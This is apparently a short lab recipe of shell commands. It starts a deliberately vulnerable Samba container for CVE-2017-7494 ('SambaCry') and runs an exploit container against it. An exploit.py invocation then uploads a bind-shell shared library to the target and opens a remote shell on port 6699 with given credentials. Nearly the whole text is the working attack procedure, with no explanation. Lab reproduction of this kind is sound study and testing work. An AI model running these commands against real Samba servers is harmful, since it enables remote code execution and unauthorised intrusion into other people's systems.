docker network create smbnet

docker run --rm -it --name samba --network smbnet -p 137-139:137-139 -p 445:445 -p 6699:6699 vulnerables/cve-2017-7494

docker run -ti --network smbnet bencer/sambacry

./exploit.py -t samba -e libbindshell-samba.so -s data -r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699
